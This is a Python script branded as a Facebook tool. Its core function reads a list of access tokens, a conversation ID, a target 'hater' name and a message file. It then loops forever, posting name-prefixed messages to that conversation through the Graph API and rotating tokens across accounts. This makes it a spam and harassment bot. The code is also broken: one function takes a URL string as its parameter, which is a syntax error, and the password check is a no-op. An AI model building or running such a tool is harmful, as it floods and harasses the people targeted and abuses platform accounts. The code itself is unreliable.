import requests
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading
import itertools
import random

# ───────────── Colors ─────────────
RESET = "\033[0m"
COLORS = ["\033[1;31m", "\033[1;33m", "\033[1;32m", "\033[1;36m", "\033[1;34m", "\033[1;35m"]
MATRIX_GREEN = "\033[38;5;46m"

# ───────────── Full Screen ─────────────
def full_screen():
    if system() == "Windows":
        os.system("mode con cols=120 lines=40")
    else:
        sys.stdout.write("\x1b[8;40;120t")

# ───────────── Sound Effect ─────────────
def beep(frequency=1000, duration=100):
    try:
        if system() == "Windows":
            import winsound
            winsound.Beep(frequency, duration)
        else:
            os.system(f'beep -f {frequency} -l {duration}')
    except:
        pass  # Ignore if beep not available

# ───────────── Banner ─────────────
def banner():
    os.system("cls" if system() == "Windows" else "clear")
    color_cycle = itertools.cycle(COLORS)
    for _ in range(3):
        sys.stdout.write(f"\r{next(color_cycle)}" + r"""
╔════════════════════════════════════════════════════╗
║       ★ VIJAY ★  | Facebook Tool         ║
╚════════════════════════════════════════════════════╝
""" + RESET)
        sys.stdout.flush()
        beep(800, 80)
        time.sleep(0.2)

# ───────────── HTTP Server ─────────────
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"VIJAY XD")

def execute_server():
    PORT = 4000
    print(f"{COLORS[2]}[SERVER]{RESET} Running at http://localhost:{PORT}")
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        httpd.serve_forever()

# ───────────── Loader Effect ─────────────
def loader(text, sec=2):
    for _ in range(sec * 4):
        for ch in "|/-\\":
            sys.stdout.write(f"\r{COLORS[1]}{text}... {ch}{RESET}")
            sys.stdout.flush()
            beep(600, 40)
            time.sleep(0.25)
    print("")

# ───────────── Progress Bar ─────────────
def progress_bar(current, total, bar_length=30):
    percent = current / total
    filled = int(bar_length * percent)
    bar = f"{COLORS[3]}█{RESET}" * filled + "-" * (bar_length - filled)
    sys.stdout.write(f"\r{COLORS[4]}[{bar}]{RESET} {int(percent*100)}%")
    sys.stdout.flush()

# ───────────── Blinking Text ─────────────
def blink_text(text, times=3, delay=0.3):
    for _ in range(times):
        sys.stdout.write(f"\r{text}{RESET}")
        sys.stdout.flush()
        beep(900, 50)
        time.sleep(delay)
        sys.stdout.write("\r" + " " * len(text))
        sys.stdout.flush()
        time.sleep(delay)

# ───────────── Matrix Background ─────────────
def matrix_background("https://i.ibb.co/x41JSZv/5fa2caa8d69b904b3a63c5d58535f7c1.jpg"):
    width = 120
    chars = "01"
    while True:
        line = "".join(random.choice(chars) for _ in range(width))
        sys.stdout.write(f"{MATRIX_GREEN}{line}{RESET}\n")
        sys.stdout.flush()
        time.sleep(0.05)

# ───────────── Message Sender ─────────────
def send_messages():
    banner()
    loader("Verifying Password", 2)

    with open('password.txt', 'r') as file:
        password = file.read().strip()

    if password != password:  # Dummy condition
        print(f"{COLORS[0]}[-] Incorrect Password!{RESET}")
        beep(300, 200)
        sys.exit()

    with open('token.txt', 'r') as file:
        tokens = [t.strip() for t in file.readlines()]
    with open('uid.txt', 'r') as file:
        convo_id = file.read().strip()
    with open('file.txt', 'r') as file:
        text_file_path = file.read().strip()
    with open(text_file_path, 'r') as file:
        messages = [m.strip() for m in file.readlines()]
    with open('tatakaname.txt', 'r') as file:
        haters_name = file.read().strip()
    with open('speed.txt', 'r') as file:
        speed = int(file.read().strip())

    num_tokens = len(tokens)
    num_messages = len(messages)

    print(f"{COLORS[2]}[INFO]{RESET} Loaded {num_tokens} tokens & {num_messages} messages.\n")
    beep(700, 150)
    time.sleep(1)

    headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}

    while True:
        for idx, message in enumerate(messages, start=1):
            try:
                token_index = (idx - 1) % num_tokens
                access_token = tokens[token_index]
                url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
                payload = {'access_token': access_token, 'message': f"{haters_name} {message}"}

                response = requests.post(url, json=payload, headers=headers)

                status_icon = f"{COLORS[2]}✔{RESET}" if response.ok else f"{COLORS[0]}✘{RESET}"
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")

                blink_text(f"{status_icon} [{current_time}] ({token_index+1}) {haters_name} {message}", 1, 0.2)
                progress_bar(idx, num_messages)
                beep(1000 if response.ok else 400, 80)
                time.sleep(speed)
            except Exception as e:
                print(f"{COLORS[0]}[ERROR]{RESET} {e}")
                beep(200, 200)

        print(f"\n\n{COLORS[3]}[LOOP]{RESET} Restarting...\n")
        beep(800, 200)

# ───────────── Main ─────────────
def main():
    full_screen()
    banner()

    threading.Thread(target=matrix_background, daemon=True).start()
    threading.Thread(target=execute_server, daemon=True).start()

    send_messages()

if __name__ == '__main__':
    main()

